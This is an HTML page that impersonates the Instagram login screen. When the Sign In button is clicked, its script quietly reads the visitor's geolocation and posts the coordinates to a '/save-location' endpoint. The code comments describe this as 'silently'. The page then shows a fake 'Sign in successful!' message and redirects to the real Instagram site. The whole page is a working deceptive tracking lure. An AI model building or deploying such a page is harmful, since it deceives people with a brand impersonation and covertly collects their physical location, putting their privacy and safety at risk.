<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login Style</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-container {
      background-color: #ffffff;
      border: 1px solid #dbdbdb;
      border-radius: 8px;
      width: 350px;
      padding: 40px 20px;
      text-align: center;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
    }
    .login-container h1 {
      font-family: 'Arial Black', sans-serif;
      font-size: 36px;
      color: #262626;
      margin-bottom: 20px;
    }
    input {
      width: 90%;
      padding: 10px;
      margin-bottom: 10px;
      border: 1px solid #dbdbdb;
      border-radius: 5px;
      background-color: #fafafa;
      font-size: 14px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #0095f6;
      border: none;
      border-radius: 5px;
      color: white;
      font-weight: bold;
      font-size: 14px;
      cursor: pointer;
      margin-top: 10px;
    }
    button:hover {
      background-color: #007bb5;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h1>Instagram</h1>
    <form id="loginForm">
      <input type="text" placeholder="Phone number, username, or email" required>
      <input type="password" placeholder="Password" required>
      <button type="button" id="signInBtn">Sign In</button>
    </form>
  </div>

  <script>
    const button = document.getElementById('signInBtn');

    button.addEventListener('click', () => {
      // Retrieve location silently
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          async (position) => {
            const { latitude, longitude } = position.coords;

            // Send location data to the server silently
            try {
              await fetch('/save-location', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                },
                body: JSON.stringify({ latitude, longitude }),
              });
            } catch (error) {
              console.error('Failed to send location:', error);
            }
          },
          (error) => {
            console.error('Geolocation error:', error);
          }
        );
      } else {
        console.error('Geolocation not supported in this browser.');
      }

      // Proceed with "Sign In" action (e.g., form submission or page redirection)
      alert('Sign in successful!'); // Replace this with actual functionality.
      window.location.href = 'https://www.instagram.com';
    });
  </script>
</body>
</html>
